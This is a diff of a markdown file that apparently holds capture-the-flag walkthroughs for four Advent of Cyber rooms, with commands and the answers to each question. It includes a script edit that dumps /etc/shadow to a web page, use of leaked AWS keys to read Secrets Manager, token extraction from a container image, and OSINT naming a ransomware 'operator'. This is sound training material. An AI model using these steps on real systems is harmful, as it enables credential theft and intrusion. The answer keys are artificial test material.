@@ -554,65 +554,252 @@ type Schedule.txt
 ## Dev(Insecure)Ops
 
 ```markdown
-1. How many pages did the dirb scan find with its default wordlist?
+This room is about CI/CD process and the risks associated with it.
 
-2. How many scripts do you see in the /home/thegrinch/scripts folder?
+We visit <http://10.10.100.183/>; we can scan it for further info.
 
-3. What are the five characters following $6$G in pepper's password hash?
+After the ffuf scan, we get two directories - warez and admin.
 
-4. What is the content of the flag.txt file on the Grinch's user's desktop?
+Checking <http://10.10.100.183/admin> and its source code gives us more info.
+
+Now, we can ssh into the machine using given creds.
+
+We have to navigate to the scripts folder and check the scripts to understand the workflow.
+
+We can see that loot.sh can be edited by us.
+
+Following the walkthrough, we edit the scripts accordingly.
+```
+
+```shell
+ffuf -u http://10.10.100.183/FUZZ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -s
+
+ssh mcskidy@10.10.100.183
+#ssh using given creds
+
+cd /home/thegrinch/scripts
+
+ls -la
+#check the scripts
+
+cat loot.sh
+
+nano loot.sh
+#edit to print /etc/shadow
+#cat /etc/shadow > /var/www/html/ls.html
+
+nano loot.sh
+#edit to print check.sh
+#cat /home/thegrinch/scripts/check.sh > /var/www/html/ls.html
+
+nano loot.sh
+#edit to print flag
+#cat /home/thegrinch/Desktop/flag.txt > /var/www/html/ls.html
+```
+
+```markdown
+1. How many pages did the dirb scan find with its default wordlist? - 4
+
+2. How many scripts do you see in the /home/thegrinch/scripts folder? - 4
+
+3. What are the five characters following $6$G in pepper's password hash? - ZUP42
+
+4. What is the content of the flag.txt file on the Grinch's user's desktop? - DI3H4rdIsTheBestX-masMovie!
 ```
 
 ## Ransomware Madness
 
 ```markdown
-1. What is the operator's username?
+We have been given the ransomware note in Russian, which on translation gives:
 
-2. What social media platform is the username associated with?
+!!! IMPORTANT !!!
 
-3. What is the cryptographic identifier associated with the operator?
+Your files have been encrypted by the Grinch. We use the latest encryption technology.
 
-4. What platform is the cryptographic identifier associated with?
+To access your files, please contact your Grinch Enterprises operator.
 
-5. What is the bitcoin address of the operator?
+Your personal identification identifier: "b288b97e-665d-4105-a3b2-666da90db14b".
 
-6. What platform does the operator leak the bitcoin address on?
+The operator assigned to your case can be contacted as "GrinchWho31" on all platforms.
 
-7. What is the operator's personal email?
+!!! IMPORTANT !!!
+```
 
-8. What is the operator's real name?
+```markdown
+From the translation, we get a lot of clues.
+
+We can Google "GrinchWho31" to get the associated platforms.
+
+We can find the clues on three platforms - Twitter, Keybase and GitHub
+```
+
+```markdown
+1. What is the operator's username? - GrinchWho31
+
+2. What social media platform is the username associated with? - Twitter
+
+3. What is the cryptographic identifier associated with the operator? - 1GW8QR7CWW3cpvVPGMCF5tZz4j96ncEgrVaR
+
+4. What platform is the cryptographic identifier associated with? - Keybase.io
+
+5. What is the bitcoin address of the operator? - bc1q5q2w2x6yka5gchr89988p2c8w8nquem6tndw2f
+
+6. What platform does the operator leak the bitcoin address on? - GitHub
+
+7. What is the operator's personal email? - DonteHeath21@gmail.com
+
+8. What is the operator's real name? - Donte Heath
 ```
 
 ## Elf Leaks
 
 ```markdown
-1. What is the name of the S3 Bucket used to host the HR Website announcement?
+Here, we use the AWS CLI to access the AWS account and resources.
 
-2. What is the message left in the flag.txt object from that bucket?
+Given, the flyer image is linked from an external S3 bucket.
 
-3. What other file in that bucket looks interesting to you?
+After listing the contents of the bucket, we can check it.
 
-4. What is the AWS Access Key ID in that file?
+Following the rest of the walkthrough, we can answer the questions.
+```
 
-5. What is the AWS Account ID that access-key works for?
+```shell
+aws s3 ls s3://images.bestfestivalcompany.com/ --no-sign-request
+#list contents of s3 bucket
 
-6. What is the Username for that access-key?
+aws s3 cp s3://images.bestfestivalcompany.com/flag.txt . --no-sign-request
+#to get flag.txt object from the s3 bucket
 
-7. Under the TAGs, what is the Name of the instance?
+cat flag.txt
 
-8. What is the database password stored in Secrets Manager?
+aws s3 cp s3://images.bestfestivalcompany.com/wp-backup.zip . --no-sign-request
+
+unzip wp-backup.zip
+
+cd wp_backup
+
+ls
+
+grep -nr "AKIA"
+#search for AWS Access Key ID
+
+less wp-config.php
+#note the details related to the S3 bucket
+
+aws configure --profile aocthm
+#enter the details noted above here
+#to configure profile
+
+aws sts get-access-key-info --access-key-id AKIAQI52OJVCPZXFYAOI --profile aocthm
+#gives us the AWS account ID
+
+aws sts get-caller-identity --profile aocthm
+#gives user ID and ARN
+
+aws ec2 describe-instances --output text --profile aocthm
+#list EC2 instances
+
+aws secretsmanager help
+#view commands
+
+aws secretsmanager list-secrets --profile aocthm
+#lists all secrets
+
+aws secretsmanager get-secret-value --secret-id HR-Password --profile aocthm
+#we do not get secret string here
+#hint shows that we have to specify north region
+
+aws secretsmanager get-secret-value --secret-id HR-Password --profile aocthm --region us-north-1
+#this does not work
+#we can try other regions
+
+aws secretsmanager get-secret-value --secret-id HR-Password --profile aocthm --region eu-north-1
+#gives us the DB password
+```
+
+```markdown
+1. What is the name of the S3 Bucket used to host the HR Website announcement? - images.bestfestivalcompany.com
+
+2. What is the message left in the flag.txt object from that bucket? - It's easy to get your elves data when you leave it so easy to find!
+
+3. What other file in that bucket looks interesting to you? - wp-backup.zip
+
+4. What is the AWS Access Key ID in that file? - AKIAQI52OJVCPZXFYAOI
+
+5. What is the AWS Account ID that access-key works for? - 019181489476
+
+6. What is the Username for that access-key? - ElfMcHR@bfc.com
+
+7. Under the TAGs, what is the Name of the instance? - HR-Portal
+
+8. What is the database password stored in Secrets Manager? - Winter2021!
 ```
 
 ## Playing With Containers
 
 ```markdown
-1. What command will list container images stored in your local container registry?
+Given, we have a public Elastic Container Registry at <https://gallery.ecr.aws/h0w1j9u3/grinch-aoc>
 
-2. What command will allow you to save a docker image as a tar archive?
+We can pull the image and run it locally to check.
 
-3. What is the name of the file for the configuration, repository tags, and layer hash values stored in a container image?
+We can also check the container image and its files.
+```
 
-4. What is the token value you found for the bonus challenge?
+```shell
+docker images
+#list container images stored
+
+docker pull public.ecr.aws/h0w1j9u3/grinch-aoc:latest
+#retrieve container image
+
+docker run -it public.ecr.aws/h0w1j9u3/grinch-aoc:latest
+#run container and interact with it
+#-it opens shell inside container image
+
+ls -la
+
+printenv
+#environment configurations
+#this gives us an api key
+
+exit
+#exit container shell
+
+mkdir aoc
+
+cd aoc
+
+docker save -o aoc.tar public.ecr.aws/h0w1j9u3/grinch-aoc:latest
+#save container image as a tar file
+
+tar -xvf aoc.tar
+#decompress file
+
+cat manifest.json | jq
+#print file using jq (pretty-print)
+#includes Config, RepoTags and Layers
+
+cat f886f00520700e2ddd74a14856fcc07a36c819b4cea8cee8be83d4de01e9787.json | jq
+#print Config file
+
+cd 4416e55edf1a706527e19102949972f4a8d89bbe2a45f917565ee9f3b08b7682
+
+ls
+
+tar -xvf layer.tar
+
+cat root/envconsul/config.hcl | grep "token"
+#prints token value
+```
+
+```markdown
+1. What command will list container images stored in your local container registry? - docker images
+
+2. What command will allow you to save a docker image as a tar archive? - docker save
+
+3. What is the name of the file for the configuration, repository tags, and layer hash values stored in a container image? - manifest.json
+
+4. What is the token value you found for the bonus challenge? - 7095b3e9300542edadbc2dd558ac11fa
 ```
 
 ## Something Phishy Is Going On
